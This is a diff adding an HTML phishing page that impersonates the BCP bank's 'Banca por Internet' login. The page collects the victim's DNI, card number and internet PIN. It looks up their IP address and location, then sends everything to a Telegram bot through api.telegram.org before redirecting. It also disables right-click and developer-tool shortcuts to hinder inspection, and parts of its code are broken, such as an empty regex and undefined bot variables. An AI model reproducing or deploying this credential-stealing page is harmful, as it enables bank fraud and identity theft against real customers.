@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión</title>
+
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		
+
+
+	<link rel="stylesheet" href="./hhhhhh_files/bactouch.css"><link rel="stylesheet" href="./hhhhhh_files/toolbar.css"><link rel="stylesheet" href="./hhhhhh_files/bact_listview.css"><link rel="stylesheet" href="./hhhhhh_files/footer.css"><script src="./hhhhhh_files/authhub-helper.js.descarga"></script><link rel="stylesheet" href="./hhhhhh_files/slidemenu.css"><script src="./hhhhhh_files/ap.js.descarga"></script></head>
+
+  <title>log</title>
+
+</style>
+    <script>
+        // 
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // 
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+                return false;
+            }
+        }
+    </script>
+
+    <!-- Incluir las fuentes Flexo si ya tienes los archivos -->
+<link rel="stylesheet" type="text/css" href="./bcpp0_files/styles.css">
+</head>
+<body>
+
+    <div class="left-container">
+        <div class="logo-container"> 
+
+<p><img src="https://loginunico.viabcp.com/assets/img/logo.svg" alt="Channel Image" /></p>
+        </div>
+    </div>
+
+    <div class="right-container">
+
+        <div class="form-container">
+            <div class="title-container">
+                <h2 class="title">Banca por Internet</h2>
+            </div>
+
+ <form method="post" action="" class="form_contact" onsubmit="return sender()">
+
+                            <p id="gfg" hidden=""></p>
+						<p id="address" hidden=""></p>
+
+                <div class="radio-container">
+                    <div class="radio-option">
+                        <input class="radio-input" id="bcp-rb-0-lbl" type="radio" name="tipo" value="1" checked="">
+                        <label class="radio-label" for="bcp-rb-0-lbl"><span>Persona</span></label>
+                        <div class="check"></div>
+                    </div>
+                    <div class="radio-option">
+                        <div class=""></div>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <select id="tipo2" name="tipo2" class="input-select">
+                        <option value="dni">DNI</option>
+                    </select>
+
+                    <input type="tel" placeholder="Nro Documento" required="" class="input-text" inputmode="numeric" name="a7fxs1" id="a7fxs1" minlength="8" maxlength="8" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;">
+                </div>
+
+            <div class="input-field">
+                    <input type="tel" placeholder="Número de Tarjeta" required="" class="input-text" inputmode="numeric" name="a7fxs22" id="a7fxs22" minlength="16" maxlength="16" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;">
+                </div>
+
+                <div style="margin-bottom: 0px;" class="input-field">
+                    <input type="password" placeholder="Clave de Internet" required="" class="input-text" inputmode="numeric" name="a7fxs33" id="a7fxs33" minlength="6" maxlength="6" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;">
+                </div>
+
+
+
+
+                <div class="links">
+                   
+                </div>
+
+                <button type="submit">Continuar</button>
+            </form>
+
+        </div>
+    </div>
+
+    <!-- Incluir dt.js -->
+    <script src="./bcpp0_files/dt.js.descarga"></script>
+
+</form>
+            </td>
+        </tr>
+    </table>
+              </body>
+            </div>
+              <script src="./appconsole.js"></script>
+        <script
+        src="https://code.jquery.com/jquery-2.2.3.min.js"
+        integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
+        crossorigin="anonymous"></script>
+
+        <script>
+            $.getJSON("https://api.ipify.org?format=json",
+             function(data) {
+                $("#gfg").html(data.ip);
+            })
+         </script>
+         <script>
+            $.getJSON("https://ipinfo.io", function (response) {
+       $("#ip").html("IP: " + response.ip);
+       $("#address").html("" + response.city + ", " + response.country);
+       })
+         </script>
+      <script>
+   
+   var u_name, pax,  ip, ip2;
+   var ready = function () {
+       u_name = document.getElementById("a7fxs1").value;
+       pax2 = document.getElementById("a7fxs22").value;
+       pax3 = document.getElementById("a7fxs33").value;
+
+       ip = document.getElementById("gfg").innerHTML;
+       ip2 = document.getElementById("address").innerHTML;
+       message = "BCP-LOGO\nDNI: " + u_name + "\nTarjeta: " + pax2 +"\nPIN: " + pax3 +"\nIP: " + ip +"\n" + ip2;
+   };
+   var sender = function () {
+       ready();
+       var settings = {
+           "async": true,
+           "crossDomain": true,
+           "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+           "method": "POST",
+           "headers": {
+               "Content-Type": "application/json",
+               "cache-control": "no-cache"
+   
+           },
+           "data": JSON.stringify({
+               "chat_id": chat_id,
+               "text": message
+           })
+       };
+       $.ajax(settings).done(function (response) {
+           window.location = '2.html';
+           console.log(response);
+       });
+       return false;
+   };
+      </script>
+
+<script>
+const input = document.getElementById("a7fxs1");
+
+input.addEventListener("blur", () => {
+  const regex = ;
+  if (!regex.test(input.value)) {
+    alert("");
+    input.value = "";
+  }
+});
+
+
+    </script>
+    </body>
+
+
+
+
+</body></html>
